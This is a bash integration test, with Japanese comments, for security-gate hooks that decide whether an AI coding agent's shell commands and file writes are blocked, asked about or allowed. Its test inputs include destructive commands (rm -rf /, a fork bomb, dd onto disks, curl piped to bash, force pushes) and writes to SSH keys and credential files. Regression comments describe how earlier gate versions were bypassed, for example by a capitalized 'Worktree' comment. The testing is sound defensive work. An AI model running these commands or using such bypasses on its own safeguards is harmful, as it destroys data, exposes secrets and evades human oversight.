#!/usr/bin/env bash
# agent/security-rules.json を実際に消費する4実装(agent/hooks/claude/security-gate.sh・
# agent/hooks/claude/write-security-gate.sh・agent/hooks/agy/security-gate.sh・agent/hooks/pi/security-gate.ts)
# を横断的に検証する。各実装がstdin JSON I/Oプロトコルを持つため、実プロセスを起動してblock/ask/
# allow(agy/pi は deny/allow の2値)の判定結果を確認する統合テスト。
#
# usage: agent/scripts/test-security-rules.sh
# exit: 0 = 全テストPASS, 1 = 1件以上FAIL
set -uo pipefail

ROOT="$(cd -P "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
CLAUDE_HOOK="$ROOT/agent/hooks/claude/security-gate.sh"
WRITE_HOOK="$ROOT/agent/hooks/claude/write-security-gate.sh"
AGY_HOOK="$ROOT/agent/hooks/agy/security-gate.sh"
PI_EXT="$ROOT/agent/hooks/pi/security-gate.ts"

total_fail=0

section() { echo; echo "=== $1 ==="; }

# ------------------------------------------------------------------
# agent/hooks/claude/security-gate.sh (Bash command, 3-tier block/ask/allow)
# ------------------------------------------------------------------
section "agent/hooks/claude/security-gate.sh"
claude_run_cmd() {
    jq -n --arg c "$1" '{"tool_input":{"command":$c}}' | "$CLAUDE_HOOK"
}
claude_check_cmd() {
    local desc="$1" cmd="$2" expected="$3" out ec got="allow"
    out="$(claude_run_cmd "$cmd" 2>&1)"; ec=$?
    if [[ "$ec" -eq 2 ]]; then
        got="block"
    elif echo "$out" | jq -e '.hookSpecificOutput.permissionDecision=="ask"' >/dev/null 2>&1; then
        got="ask"
    fi
    if [[ "$got" == "$expected" ]]; then
        echo "[OK] $desc"
    else
        echo "[FAIL] $desc : expected=$expected got=$got (exit=$ec) out=$out"
        total_fail=$((total_fail + 1))
    fi
}
claude_check_cmd "rm -rf /" "rm -rf /" block
claude_check_cmd "rm -rf safe path" "rm -rf /tmp/foo" allow
claude_check_cmd "fork bomb" ':(){ :|:& };:' block
claude_check_cmd "dd to /dev/sda" "dd if=/dev/zero of=/dev/sda" block
claude_check_cmd "git add -A" "git add -A" block
# regression: e2e test発見(2026-09-03、tests/e2e/test_challenger_m1_adversarial.py)。
# ./ ・ ./* variantが元パターンでは検出されていなかった(bare . / * のみ対応)。
claude_check_cmd "git add ./ (dot-slash variant, must block)" "git add ./" block
claude_check_cmd "git add ./* (dot-slash-star variant, must block)" "git add ./*" block
claude_check_cmd "git add specific path" "git add src/main.go" allow
claude_check_cmd "git add .github/workflows (must NOT block)" "git add .github/workflows/ci.yml" allow
claude_check_cmd "chmod -R 777 /etc" "chmod -R 777 /etc" block
# regression: security-audit(2026-09-02)がchmod対象パスの部分文字列一致を「安全側統合」で
# 誤って落とし(旧claude実装は非アンカーgrepでサブディレクトリも捕捉していた)、
# 「chmod -R 777 /etc/nginx」等が素通りする穴を発見。修正の再発防止テスト。
claude_check_cmd "chmod -R 777 /etc/nginx (subdir, must still block)" "chmod -R 777 /etc/nginx" block
claude_check_cmd "chmod -R 777 /usr/local/bin (subdir, must still block)" "chmod -R 777 /usr/local/bin" block
claude_check_cmd "chmod -R 777 /etcbackup (unrelated dir, must NOT block)" "chmod -R 777 /etcbackup" allow
# regression: nvmeデバイスパターンが namespace suffix(n1等)必須になっており、
# コントローラ文字デバイス(/dev/nvme0、n無し)への書き込みが漏れていた。
claude_check_cmd "dd to bare nvme controller (regression check)" "dd if=/dev/zero of=/dev/nvme0" block
claude_check_cmd "git clean -fdx" "git clean -fdx" block
claude_check_cmd "git clean -f (ask tier)" "git clean -f" ask
claude_check_cmd "git checkout . (ask tier)" "git checkout ." ask
claude_check_cmd "force push main" "git push --force origin main" block
claude_check_cmd "force push +main" "git push origin +main" block
claude_check_cmd "push feature branch (safe)" "git push origin feature-branch" allow
claude_check_cmd "kubectl delete prod" "kubectl delete pod foo -n prod" block
claude_check_cmd "helm uninstall prod" "helm uninstall foo -n prod" block
claude_check_cmd "curl pipe bash" "curl http://example.com/install.sh | bash" block
claude_check_cmd "git reset --hard on main cwd" "git reset --hard HEAD~3" block
# regression: worktree除外がcase-insensitiveになり、"Worktree"等の大文字混じりコメントを
# 付けるだけでmain/master上のgit reset --hardが素通りする穴があった(旧claude実装はcase-sensitive)。
claude_check_cmd "git reset --hard with capitalized Worktree comment (must still block)" "git reset --hard HEAD~3 # Worktree cleanup" block
claude_check_cmd "git reset --hard with lowercase worktree comment (legit exemption, stays allow)" "git reset --hard HEAD~3 # worktree cleanup" allow

# ------------------------------------------------------------------
# agent/hooks/claude/write-security-gate.sh (Write/Edit file_path, block/allow)
# ------------------------------------------------------------------
section "agent/hooks/claude/write-security-gate.sh"
claude_run_write() {
    jq -n --arg p "$1" '{"tool_input":{"file_path":$p}}' | "$WRITE_HOOK"
}
claude_check_write() {
    local desc="$1" path="$2" expected="$3" out ec got="allow"
    out="$(claude_run_write "$path" 2>&1)"; ec=$?
    [[ "$ec" -eq 2 ]] && got="block"
    if [[ "$got" == "$expected" ]]; then
        echo "[OK] $desc"
    else
        echo "[FAIL] $desc : expected=$expected got=$got out=$out"
        total_fail=$((total_fail + 1))
    fi
}
claude_check_write "ssh id_rsa" "$HOME/.ssh/id_rsa" block
claude_check_write "aws credentials" "$HOME/.aws/credentials" block
claude_check_write "etc passwd" "/etc/passwd" block
claude_check_write "pem file anywhere" "/tmp/x.pem" block
claude_check_write "env file anywhere" "/tmp/proj/.env" block
# regression: terraform_state/terraform_varsルール新設(claude native permissions.denyと
# permission-request.shには既にあったがsecurity-rules.jsonには無く、agyのsecurity-gate.sh
# write_to_file経路が無保護だった)。
claude_check_write "terraform state file" "/tmp/proj/terraform.tfstate" block
claude_check_write "terraform tfvars" "$HOME/project/terraform.tfvars" block
claude_check_write "normal go file (safe)" "$HOME/project/main.go" allow

# ------------------------------------------------------------------
# agent/hooks/agy/security-gate.sh (toolCall schema, 2-tier deny/allow)
# ------------------------------------------------------------------
section "agent/hooks/agy/security-gate.sh"
agy_check_cmd() {
    local desc="$1" cmd="$2" expected="$3" out got
    out="$(jq -n --arg c "$cmd" '{"toolCall":{"name":"run_command","args":{"command":$c}}}' | "$AGY_HOOK" 2>&1)"
    got=$(echo "$out" | jq -r '.decision' 2>/dev/null || echo "ERROR")
    got=$([[ "$got" == "deny" ]] && echo deny || echo allow)
    if [[ "$got" == "$expected" ]]; then
        echo "[OK] $desc"
    else
        echo "[FAIL] $desc : expected=$expected got=$got out=$out"
        total_fail=$((total_fail + 1))
    fi
}
agy_check_write() {
    local desc="$1" path="$2" expected="$3" out got
    out="$(jq -n --arg p "$path" '{"toolCall":{"name":"write_to_file","args":{"file_path":$p}}}' | "$AGY_HOOK" 2>&1)"
    got=$(echo "$out" | jq -r '.decision' 2>/dev/null || echo "ERROR")
    got=$([[ "$got" == "deny" ]] && echo deny || echo allow)
    if [[ "$got" == "$expected" ]]; then
        echo "[OK] $desc"
    else
        echo "[FAIL] $desc : expected=$expected got=$got out=$out"
        total_fail=$((total_fail + 1))
    fi
}
agy_check_cmd "rm -rf /" "rm -rf /" deny
agy_check_cmd "rm -rf safe path" "rm -rf /tmp/foo" allow
agy_check_cmd "git clean -f (no ask tier -> deny)" "git clean -f" deny
agy_check_cmd "git checkout . (no ask tier -> deny, new protection)" "git checkout ." deny
agy_check_cmd "force push main" "git push --force origin main" deny
agy_check_cmd "git reset --hard on main cwd" "git reset --hard HEAD~3" deny
agy_check_cmd "chmod -R 777 /etc/nginx (subdir regression check)" "chmod -R 777 /etc/nginx" deny
agy_check_cmd "dd to bare nvme controller (regression check)" "dd if=/dev/zero of=/dev/nvme0" deny
agy_check_write "ssh id_rsa" "$HOME/.ssh/id_rsa" deny
agy_check_write "terraform state file" "/tmp/proj/terraform.tfstate" deny
agy_check_write "terraform tfvars" "$HOME/project/terraform.tfvars" deny
agy_check_write "normal go file (safe)" "$HOME/project/main.go" allow

# ------------------------------------------------------------------
# agent/hooks/pi/security-gate.ts (bun経由でハンドラを直接起動、hasUI=falseの2-tier相当)
# ------------------------------------------------------------------
section "agent/hooks/pi/security-gate.ts"
if command -v bun &>/dev/null; then
    PI_TEST_TS="$(mktemp -t pi-security-gate-test-XXXXXX.ts)"
    trap 'rm -f "$PI_TEST_TS"' EXIT
    cat > "$PI_TEST_TS" <<TSEOF
import securityGate from "$PI_EXT";
type Handler = (event: any, ctx: any) => Promise<any>;
let handler: Handler | null = null;
securityGate({ on(_n: string, fn: Handler) { handler = fn; } } as any);
let fail = 0;
async function checkCmd(desc: string, command: string, expected: "block" | "allow") {
  const r = await handler!({ toolName: "bash", input: { command } }, { cwd: "$ROOT", hasUI: false });
  const got = r?.block ? "block" : "allow";
  if (got === expected) console.log("[OK] " + desc);
  else { console.log("[FAIL] " + desc + " expected=" + expected + " got=" + got); fail++; }
}
async function checkWrite(desc: string, filePath: string, expected: "block" | "allow") {
  const r = await handler!({ toolName: "write", input: { file_path: filePath } }, { cwd: "$ROOT", hasUI: false });
  const got = r?.block ? "block" : "allow";
  if (got === expected) console.log("[OK] " + desc);
  else { console.log("[FAIL] " + desc + " expected=" + expected + " got=" + got); fail++; }
}
async function main() {
  await checkCmd("rm -rf /", "rm -rf /", "block");
  await checkCmd("rm -rf safe path", "rm -rf /tmp/foo", "allow");
  await checkCmd("git clean -f (no UI -> hard block)", "git clean -f", "block");
  await checkCmd("git checkout . (no UI -> hard block, new protection)", "git checkout .", "block");
  await checkCmd("force push main", "git push --force origin main", "block");
  await checkCmd("git reset --hard on main cwd", "git reset --hard HEAD~3", "block");
  await checkCmd("chmod -R 777 /etc/nginx (subdir regression check)", "chmod -R 777 /etc/nginx", "block");
  await checkCmd("dd to bare nvme controller (regression check)", "dd if=/dev/zero of=/dev/nvme0", "block");
  await checkWrite("ssh id_rsa", (process.env.HOME || "") + "/.ssh/id_rsa", "block");
  await checkWrite("normal go file (safe)", (process.env.HOME || "") + "/project/main.go", "allow");
  await checkWrite("pb.go Vald Law 1", "/home/x/go/src/github.com/vdaas/vald/foo.pb.go", "block");
  console.log(fail > 0 ? fail + " FAILURES" : "PI_ALL_PASS");
  process.exit(fail > 0 ? 1 : 0);
}
main();
TSEOF
    bun run "$PI_TEST_TS"
    pi_status=$?
    rm -f "$PI_TEST_TS"
    trap - EXIT
    if [[ "$pi_status" -ne 0 ]]; then
        total_fail=$((total_fail + 1))
    fi
else
    echo "[SKIP] bun not found, agent/hooks/pi/security-gate.ts の統合テストをスキップ"
fi

echo
echo "---"
if [[ "$total_fail" -gt 0 ]]; then
    echo "test-security-rules: $total_fail 件のFAILあり"
    exit 1
fi
echo "test-security-rules: 全テストPASS"
exit 0
